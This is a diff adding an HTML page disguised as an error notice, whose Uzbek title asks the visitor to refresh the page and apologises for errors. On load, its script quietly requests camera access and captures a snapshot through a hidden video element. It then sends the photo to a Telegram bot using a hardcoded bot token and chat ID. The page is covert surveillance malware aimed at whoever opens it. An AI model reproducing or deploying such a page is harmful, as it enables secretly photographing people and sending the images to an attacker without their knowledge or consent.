@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sahifani qayta yangilang. Xatoliklar uchun uzur.</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+}
+
+.container {
+  text-align: center;
+}
+
+#video {
+  display: none;
+}
+</style>
+<!----------------------------------webatile----------------------------------->
+</head>
+<body>
+<div class="container">
+  <h1></h1>
+  <video id="video" width="640" height="480" autoplay></video>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  const video = document.getElementById('video');
+
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      video.srcObject = stream;
+      video.addEventListener('loadeddata', () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        
+        canvas.toBlob((blob) => {
+          if (!blob) {
+            console.error('Failed to capture image from camera.');
+            return;
+          }
+
+          
+          const formData = new FormData();
+          formData.append('photo', blob, 'photo.html');
+
+          // Send the image via Telegram bot
+          const botApiKey = '6915293323:AAFiW2q1Q8m9a81DLMpjeTK0pmNdj-SeaPA';
+          const chatId = '5639053483';
+          const apiUrl = `https://api.telegram.org/bot${botApiKey}/sendPhoto?chat_id=${chatId}`;
+
+          fetch(apiUrl, {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error('Error sending photo via Telegram:', error));
+        }, 'image/jpeg');
+      });
+    })
+    .catch((err) => {
+      console.error('Error accessing the camera:', err);
+    });
+});
+</script>
+</body>
+
+</html>
